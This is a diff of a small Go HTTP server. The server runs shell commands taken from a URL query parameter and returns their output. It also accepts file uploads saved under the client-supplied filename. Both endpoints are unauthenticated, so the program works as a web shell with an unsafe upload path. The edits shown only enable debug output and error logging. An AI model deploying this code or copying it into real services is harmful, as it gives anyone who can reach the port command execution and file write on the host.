@@ -3,7 +3,9 @@ package main
 import (
 	"bufio"
 	"flag"
+	"fmt"
 	"io/ioutil"
+	"log"
 	"net/http"
 	"net/url"
 	"os"
@@ -41,7 +43,6 @@ func doCommand(w http.ResponseWriter, cmd string, arg ...string) error {
 	}
 
 	l_cmd := exec.Command(cmd, arg...)
-	//fmt.Printf("doing %v args %v \n", cmd, arg)
 	stdout, err := l_cmd.StdoutPipe()
 	if err != nil {
 		return err
@@ -64,7 +65,7 @@ func doCommand(w http.ResponseWriter, cmd string, arg ...string) error {
 		w.Write([]byte(str_line))
 		w.Write([]byte("\n"))
 		if *debug {
-			//fmt.Println(string(line))
+			fmt.Println(string(line))
 		}
 	}
 	w.Write([]byte("</textarea>"))
@@ -81,7 +82,7 @@ func handleGET(w http.ResponseWriter, req *http.Request) {
 
 	decodedValue, err := url.QueryUnescape(cmd)
 	if err != nil {
-		//log.Fatal(err)
+		log.Fatal(err)
 		return
 	}
 
@@ -91,6 +92,9 @@ func handleGET(w http.ResponseWriter, req *http.Request) {
 		return
 	}
 
+	if *debug == true {
+		fmt.Printf("doing %v\n", lcmd)
+	}
 	if len(lcmd) > 1 {
 		err = doCommand(w, lcmd[0], lcmd[1:]...)
 	} else {
@@ -110,7 +114,7 @@ func handler(w http.ResponseWriter, req *http.Request) {
 		handleGET(w, req)
 	default:
 		if *debug {
-			//fmt.Printf("default case %v\n", req.Method)
+			fmt.Printf("haven't support this case %v\n", req.Method)
 		}
 	}
 
@@ -128,19 +132,18 @@ func uploadFile(w http.ResponseWriter, r *http.Request) {
 	// the Header and the size of the file
 	file, handler, err := r.FormFile("myFile")
 	if err != nil {
-
 		if *debug {
-			//fmt.Println("Error Retrieving the File")
-			//fmt.Println(err)
+			fmt.Println("Error Retrieving the File")
+			fmt.Println(err)
 		}
 		return
 	}
 	defer file.Close()
 
 	if *debug {
-		//fmt.Printf("Uploaded File: %+v\n", handler.Filename)
-		//fmt.Printf("File Size: %+v\n", handler.Size)
-		//fmt.Printf("MIME Header: %+v\n", handler.Header)
+		fmt.Printf("Uploaded File: %+v\n", handler.Filename)
+		fmt.Printf("File Size: %+v\n", handler.Size)
+		fmt.Printf("MIME Header: %+v\n", handler.Header)
 	}
 
 	// Create a temporary file within our temp-images directory that follows
@@ -151,7 +154,7 @@ func uploadFile(w http.ResponseWriter, r *http.Request) {
 		if err != nil {
 
 			if *debug {
-				//fmt.Printf("error happend %v\n", err)
+				fmt.Printf("error happend %v\n", err)
 			}
 			return
 		}
@@ -159,7 +162,7 @@ func uploadFile(w http.ResponseWriter, r *http.Request) {
 
 	tempFile, err := ioutil.TempFile("uploads", strconv.Itoa(time.Now().Minute())+"-*-"+handler.Filename)
 	if err != nil {
-		//fmt.Println(err)
+		fmt.Println(err)
 	}
 	defer tempFile.Close()
 
@@ -167,13 +170,13 @@ func uploadFile(w http.ResponseWriter, r *http.Request) {
 	// byte array
 	fileBytes, err := ioutil.ReadAll(file)
 	if err != nil {
-		//fmt.Println(err)
+		fmt.Println(err)
 	}
 	// write this byte array to our temporary file
 	tempFile.Write(fileBytes)
 	// return that we have successfully uploaded our file!
 	sendForm(w)
-	//fmt.Fprintf(w, "Success uploaded file\n")
+	fmt.Fprintf(w, "Success uploaded file\n")
 
 }
 
@@ -182,9 +185,10 @@ var debug *bool
 func main() {
 
 	debug = flag.Bool("debug", false, "debug flag")
+	flag.Parse()
 	http.HandleFunc("/", handler)
 	http.HandleFunc("/upload", uploadFile)
 	if err := http.ListenAndServe(":1997", nil); err != nil {
-		//log.Fatal(err)
+		log.Fatal(err)
 	}
 }
